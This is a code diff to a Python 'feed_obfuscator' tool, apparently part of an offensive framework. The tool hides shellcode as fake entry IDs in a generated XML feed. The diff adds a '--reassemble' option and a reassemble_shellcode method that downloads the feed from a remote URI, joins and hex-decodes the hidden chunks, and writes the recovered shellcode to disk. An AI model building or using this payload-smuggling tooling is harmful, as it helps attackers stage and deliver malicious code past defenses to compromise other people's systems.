@@ -1,5 +1,6 @@
 import utils.arg
 import datetime
+import feedparser
 from lxml import etree
 
 class feed_obfuscator:
@@ -13,16 +14,19 @@ class feed_obfuscator:
     feed_fake_ids = []
     shellcode = ''
 
-    def __init__(self, input_file, output_file):
+    def __init__(self, input_file, output_file, uri):
         self.input_file = input_file
         self.output_file = output_file
+        self.uri = uri
 
 
     def init():
         spName = 'feed'
         spArgList = [
             ['-i', '--input', '', '', 'Input file for feed obfucsation'],
-            ['-o', '--output', '', '', 'Output file for feed obfucsation']
+            ['-o', '--output', '', '', 'Output file for feed obfucsation'],
+            ['-r', '--reassemble', '', 'store_true', 'Reassemble fake feed to Shellcode'],
+            ['-u', '--uri', '', '', 'URI to fake feed']
         ]
         utils.arg.CreateSubParser(spName, feed_obfuscator.Description, spArgList)
 
@@ -37,7 +41,7 @@ class feed_obfuscator:
     def convert_bytes_to_fake_id(self, block_size=16):
         s = self.shellcode.encode('utf-8')
         self.feed_fake_ids.extend([s[i:i + block_size] for i in range(0, len(s), block_size)])
-        print(f'{self.feed_fake_ids}')
+        #print(f'{self.feed_fake_ids}')
 
 
     def generate_feed(self):
@@ -81,4 +85,15 @@ class feed_obfuscator:
         xml_str = etree.tostring(root, pretty_print=True, xml_declaration=True, encoding="utf-8")
         with open(self.output_file, "wb") as file:
             file.write(xml_str)
+
+    def reassemble_shellcode(self):
+        feed = feedparser.parse(self.uri)
+        for entry in feed.entries:
+            pos = entry.id.rfind('/')
+            self.shellcode += entry.id[pos + 1:]
+        #print(self.shellcode)
+        out_shellcode = bytes.fromhex(self.shellcode)
+        with open(self.output_file, 'wb') as file:
+            file.write(out_shellcode)
+
 
